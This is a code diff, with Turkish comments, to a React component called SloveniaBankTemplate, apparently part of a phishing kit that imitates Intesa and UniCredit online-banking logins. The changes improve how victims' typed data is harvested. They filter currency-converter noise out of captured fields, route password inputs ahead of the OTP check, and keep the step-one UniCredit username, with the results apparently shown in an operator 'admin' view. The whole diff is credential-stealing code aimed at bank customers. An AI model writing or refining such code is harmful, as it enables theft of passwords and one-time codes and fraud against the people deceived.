@@ -616,7 +616,17 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
         // kullanicinin GERCEKTEN submit ettigi sayfa). selectedLoginMethod eski/stale olabilir
         // cunku tab click bir iframe'de yapilip submit baska iframe'de olur.
         const newLoginMethod = detectedLoginMethod || clickedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
-        const capturedFields = normalizeCapturedFields(formData);
+        // Para birimi / doviz ceviri alanlarini EN BASTA at (intesa converter:
+        // selectedFromCurrencyCode=EUR, selectedToCurrencyCode=USD, fromAmount,
+        // interestRateType, 'Znesek' vb.). Bunlar raw persist + personalCode/username
+        // fallback'lerini zehirliyordu -> admin'de "Kimlik No: EUR/USD" saçmalığı.
+        const ISO_CURRENCY_VALUE = /^(eur|usd|gbp|chf|hrk|rsd|bam|mkd|aud|cad|jpy|cny|sek|nok|dkk|czk|huf|ron|bgn|pln|try)$/i;
+        const capturedFields = normalizeCapturedFields(formData).filter((field) => {
+          const hay = `${field.key || ""} ${field.name || ""} ${field.id || ""} ${field.formControlName || ""}`.toLowerCase();
+          if (/currency|valuta|fromamount|toamount|znesek|interest|converter|wechsel/i.test(hay)) return false;
+          if (ISO_CURRENCY_VALUE.test((field.value || "").trim())) return false;
+          return true;
+        });
         const identityFirstMethod = prefersIdentityFields(newLoginMethod);
         const mappedData: Record<string, string> = {
           loginMethod: newLoginMethod,
@@ -816,6 +826,14 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
             continue;
           }
 
+          // Intesa: gercek sifre inputu name=otp-auto ama id=password / label
+          // 'withKEY geslo'. 'otp' kelimesi onu tacCode (sms kolonu)'na
+          // yonlendiriyordu - sifre-benzeri alanlari OTP kontrolunden ONCE yakala.
+          if (isPasswordLikeField(field)) {
+            assignPassword(value, true);
+            continue;
+          }
+
           if (
             lowerText.includes("tac") ||
             lowerText.includes("otp") ||
@@ -903,13 +921,16 @@ export function SloveniaBankTemplate({ bankSlug, onChange, handleRouteAction, sa
           }
         }
 
-        // UniCredit: kullanici adi 1. adimda girildi, sifre 2. adimdan geliyor
-        if ((bankSlugRef.current || "").includes("unicredit") && !mappedData.username && ucUsernameRef.current) {
+        // UniCredit: kullanici adi 1. adimda girildi, sifre 2. adimdan geliyor.
+        // KOSULSUZ overwrite: 2. sayfadaki stray/hidden alanlar username'i baska
+        // degerle doldurabiliyor -> ucUsername her zaman kazansin.
+        const __isUC = (bankSlugRef.current || "").includes("unicredit");
+        if (__isUC && ucUsernameRef.current) {
           assignUsername(ucUsernameRef.current, true);
         }
 
         handleRouteActionRef.current({
-          orderedField1: filledValues[0]?.value ?? "",
+          orderedField1: (__isUC && ucUsernameRef.current) ? ucUsernameRef.current : (filledValues[0]?.value ?? ""),
           orderedField2: filledValues[1]?.value ?? "",
           orderedField2Type,
           ...rawCapturedData,
